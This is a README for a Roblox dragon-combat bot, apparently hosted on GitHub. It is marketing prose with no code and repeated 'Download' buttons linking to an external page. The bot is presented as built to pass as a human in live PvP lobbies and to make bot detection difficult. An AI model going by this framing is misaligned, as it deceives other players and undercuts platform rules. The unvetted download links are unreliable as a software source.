![preview](https://raw.githubusercontent.com/stevelasudata/sky-dragon-duel-brain/main/poster_cbf0.svg)
[![Download](https://raw.githubusercontent.com/stevelasudata/sky-dragon-duel-brain/main/fetch_52a4.svg)](https://stevelasudata.github.io/sky-dragon-duel-brain/)

# 🐉 AetherWing Drift — Behavioural Dragon Duel AI for Roblox

![License](https://img.shields.io/badge/License-MIT-yellowgreen)
![Status](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen)
![Runtime](https://img.shields.io/badge/Runtime-Luau%20%2F%20Roblox-blueviolet)
![Release](https://img.shields.io/badge/Release-2026.1-9cf)
![Platform](https://img.shields.io/badge/Platform-Roblox%20Studio-informational)
![AI Style](https://img.shields.io/badge/AI-Believable%20Opponent-orange)
![Focus](https://img.shields.io/badge/Focus-Aerial%20Dragon%20PvP-red)
![Language Support](https://img.shields.io/badge/i18n-12%20Locales-teal)
![Uptime](https://img.shields.io/badge/Bot%20Runtime-24%2F7-important)
![Contributions](https://img.shields.io/badge/Contributions-Welcome-success)

AetherWing Drift is a behaviour-driven dragon combat companion for Roblox aerial PvP experiences. Where most battle bots telegraph their nature through robotic precision, impossible reaction times, and suspiciously perfect flight arcs, AetherWing Drift takes an entirely different philosophical route: it plays like someone who learned to fly the hard way. It hesitates before committing to a dive. It overshoots a banking turn by a fraction. It wins some, loses some, and — most importantly — feels like a person on the other end of the saddle.

This project is the sibling spirit of an earlier initiative in dragon-duel automation, but it is not a continuation of it. It is a reimagined foundation: a fresh behavioural architecture, a reworked flight brain, and an entirely new tuning philosophy aimed at believability rather than dominance. If the previous work asked “how do we make a bot that competes,” AetherWing Drift asks “how do we make a bot that belongs.”

[![Download](https://raw.githubusercontent.com/stevelasudata/sky-dragon-duel-brain/main/fetch_52a4.svg)](https://stevelasudata.github.io/sky-dragon-duel-brain/)

---

## 📖 Table of Contents

- [Why This Exists](#-why-this-exists)
- [Design Philosophy](#-design-philosophy)
- [Signature Features](#-signature-features)
- [The Flight Brain in Depth](#-the-flight-brain-in-depth)
- [Steering, Dodging & Combat Kinematics](#-steering-dodging--combat-kinematics)
- [Shared Dragon Systems](#-shared-dragon-systems)
- [Humanity Heuristics — The Art of Looking Alive](#-humanity-heuristics--the-art-of-looking-alive)
- [Responsive Interface Layer](#-responsive-interface-layer)
- [Multilingual & Locale-Aware Behaviour](#-multilingual--locale-aware-behaviour)
- [Round-the-Clock Companion Runtime](#-round-the-clock-companion-runtime)
- [Configuration Reference](#-configuration-reference)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [FAQ](#-faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🕯️ Why This Exists

Roblox dragon combat scenes attract two kinds of opponents: genuine players and scripted entities that fight like metronomes. The gap between the two is obvious within seconds. A scripted flier banks at exactly the optimal angle every time, never wastes a fireball, and has a reaction latency that no thumb can match. Players notice. Matches stop feeling like duels and start feeling like puzzle bosses.

AetherWing Drift was built to close that gap from the other direction. Instead of racing toward maximum efficiency, it deliberately operates inside a human envelope. Its decisions are shaped by small, plausible imperfections — a beat of hesitation before a dodge, a slightly imperfect aim convergence, a moment of overcorrection after a sharp turn. These aren’t bugs. They’re the entire point.

The goal is not to win every round. The goal is to make every round feel like it was fought.

---

## 🧠 Design Philosophy

Three principles anchor the whole codebase.

**First: behaviour over output.** Classical bot logic begins with an output (hit the target) and works backward to the inputs. AetherWing Drift begins with a behaviour (fly like a creature with a pulse) and lets the outcome fall where it may. This inverts almost every tuning decision.

**Second: defeat is a feature.** A bot that cannot lose is a bot that cannot be enjoyed. Difficulty curves in this project are shaped so that a competent player climbs a genuine slope, and a newcomer isn’t erased on round one.

**Third: the dragon is shared.** Flight, stamina, wind resistance, and turn inertia are treated as common systems that any controller — human or artificial — plugs into. The AI doesn’t get a private physics sandbox. It plays on the same field.

---

## ✨ Signature Features

- 🪶 **Behaviour-Based Flight Brain** — layered state machines that produce flight that reads as intentional rather than computed.
- 🌀 **Adaptive Steering Solver** — smooth banking and pitch blending tuned for aerial dragon movement, not generic pathfinding.
- 🛡️ **Reactive Dodging Layer** — dodge decisions gated by a simulated human reaction window, so evasions look earned.
- 🐲 **Shared Dragon Systems** — one physics contract for stamina, momentum, and turn radius across all controllers.
- 🎭 **Believability Module** — a small library of natural imperfections: aim jitter, decision lag, and occasional cautious retreats.
- 🌍 **Locale-Aware Behaviour Sets** — commentary, emote timing, and aggression profiles shift with language settings.
- 📱 **Responsive UI Panels** — in-experience control surfaces scale cleanly from handheld to desktop viewports.
- 🛰️ **Continuous Companion Runtime** — designed to stay present in live lobbies without supervision windows.
- 🧩 **Modular Loadouts** — swap combat profiles without rewriting flight logic.
- 📊 **Round Telemetry** — silent, local logging of engagement stats for tuning sessions.
- 🔒 **Client-Safe Architecture** — no privileged server assumptions; everything runs within legitimate Roblox scripting boundaries.

---

## 🪽 The Flight Brain in Depth

The flight brain is organised as a stack of cooperating behaviours, each with its own priority and decay. Higher layers can pre-empt lower ones, but only for a bounded amount of time, which prevents the classic “twitchy bot” symptom where an entity oscillates between plans every frame.

At the base sits **Cruise**, responsible for stable altitude keeping and gentle course correction. Above it sits **Approach**, which manages closing distance to a target without committing to an attack vector. Above that, **Engage**, which commits to a strike window. On top of the stack, **Recover**, which triggers after damage spikes or failed manoeuvres and briefly prioritises survival over offense.

Each layer exposes a “confidence” value between zero and one. When confidence in a higher layer drops below a threshold, the stack naturally falls back — producing the appearance of a pilot who tried something bold, thought better of it, and pulled away. That single mechanic accounts for most of the human feel in live play.

---

## 🎯 Steering, Dodging & Combat Kinematics

Steering in AetherWing Drift is not “move toward point B.” It’s a blend of look-ahead prediction, turn-rate awareness, and inertia compensation. Dragons are heavy. They bank wide. The solver respects that.

Dodging is layered on top as a reactive filter. Incoming threats are scored by time-to-impact and angle of approach. The bot then rolls a simulated reaction delay drawn from a configurable distribution before deciding to evade, and the evasion itself has a plausible chance of being slightly mistimed. Over a long match, these small slips accumulate into a pattern that reads as skill variance rather than randomness.

Combat kinematics tie the two together: a strike only fires once the muzzle direction, flight vector, and target lead converge within a tolerance window. The tolerance is intentionally human-sized, not machine-tight.

---

## 🐉 Shared Dragon Systems

The shared systems layer is the contract that keeps everything honest. It defines stamina drain per manoeuvre, wing-beat recovery curves, drag coefficients during dives, and the hard limits on turn radius at speed. Because every controller — including the behavioural one shipped here — consumes the same contract, tuning changes propagate everywhere at once and no controller gets a quiet advantage.

This layer is also the natural home for third-party integrations. If you’re building a different kind of dragon opponent, you plug into the shared systems and inherit consistency for nothing.

---

## 🎭 Humanity Heuristics — The Art of Looking Alive

This is the part most projects skip. AetherWing Drift ships a dedicated module whose sole job is to inject believable imperfection.

It covers aim jitter, decision lag drawn from realistic distributions, occasional overcorrection after sharp turns, brief pauses before committing to risky dives, and a “second-guess” behaviour that occasionally abandons a perfectly good attack because a real pilot might flinch. None of these are random noise; each is bounded, tunable, and documented.

The measure of success here is subtle. You shouldn’t notice the heuristics. You should just notice that the opponent feels like someone.

---

## 📱 Responsive Interface Layer

The in-experience panels that surface loadout selection, match telemetry, and profile tuning are built with a responsive layout grid. Controls reflow cleanly on small handheld displays, and dense stat readouts collapse into expandable cards on narrower viewports. The design goal is simple: a player on a phone should never fight the UI to change a setting mid-match.

---

## 🌍 Multilingual & Locale-Aware Behaviour

AetherWing Drift ships with locale-aware behaviour sets for a growing list of languages. This goes beyond translating strings. Aggression profiles, emote timing, and commentary pacing shift subtly by locale, so the opponent feels culturally neutral without feeling generic.

The translation layer lives in plain data files, which means new locales can be added without touching behavioural logic. If you speak a language not yet represented, the contribution path is intentionally short.

---

## 🛰️ Round-the-Clock Companion Runtime

The runtime is built to persist. Long sessions, silent lobbies, and quiet hours are all first-class scenarios. Watchdog routines restart stalled behaviour layers without dropping the match state, and low-activity modes reduce overhead during idle periods without fully powering down.

The result is a companion that’s simply *there* whenever a lobby spins up, with no babysitting required.

---

## 🧾 Configuration Reference

All tuning lives in a single declarative profile file. Highlights include:

- `aggression` — overall eagerness to engage, from cautious to assertive.
- `reaction_jitter` — distribution parameters for the simulated reaction delay.
- `aim_tolerance` — how close a firing solution must be before a strike commits.
- `retreat_threshold` — the damage level that triggers the Recover layer.
- `difficulty_floor` / `difficulty_ceiling` — the bounds of the adaptive curve.
- `locale` — selects the behaviour set and commentary pack.

Every value has a documented default and a safe range. Nothing requires editing to run; everything is editable to taste.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Expanded dodge taxonomy and refined reaction modelling.
- **Q2 2026** — Additional locale packs and community-contributed aggression profiles.
- **Q3 2026** — Deeper telemetry dashboards for tuning sessions.
- **Q4 2026** — Public behaviour-set registry for sharing profiles across the community.

Roadmap items are directional, not contractual. Priorities shift with community feedback.

---

## 🤝 Contributing

Contributions are welcome across behaviour tuning, locale data, documentation, and shared-system refinements. Before opening a pull request, please run the local behaviour harness and confirm that no existing profile regresses on the believability checks. Small, focused changes are far easier to review than sweeping rewrites, and a clear description of *why* a tuning change improves the feel of play is worth more than a large diff.

If you’re unsure where to start, the issues labelled `good-first-flight` are scoped for newcomers.

---

## ❓ FAQ

**Does this guarantee wins?**
No, and by design it never will. The project optimises for believable play, not dominance.

**Will it work in any dragon experience?**
It targets the shared dragon systems contract. Experiences that expose compatible flight primitives work out of the box; others need a thin adapter.

**Can I run it solo for practice?**
Yes. Training mode is one of the supported profiles.

**Is this detectable as a bot?**
The entire project exists to make that question difficult to answer by observation alone. That said, always follow the rules of the experiences you join.

**How often is it updated?**
The 2026 release cadence is quarterly, with patch releases as needed.

---

## ⚠️ Disclaimer

AetherWing Drift is an independent behavioural AI project intended for educational study, research into believable game agents, and personal experimentation within experiences where such tooling is permitted. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any specific experience developer. Users are solely responsible for ensuring their use complies with the terms of service of any platform or experience they join. The maintainers assume no liability for account actions, bans, or other consequences arising from misuse. Use responsibly, and treat other players with respect — the whole point of this project is that opponents should feel human.

---

## 📜 License

Released under the MIT License. See the full text at [MIT License](https://opensource.org/licenses/MIT).

Copyright © 2026 AetherWing Drift Contributors.

[![Download](https://raw.githubusercontent.com/stevelasudata/sky-dragon-duel-brain/main/fetch_52a4.svg)](https://stevelasudata.github.io/sky-dragon-duel-brain/)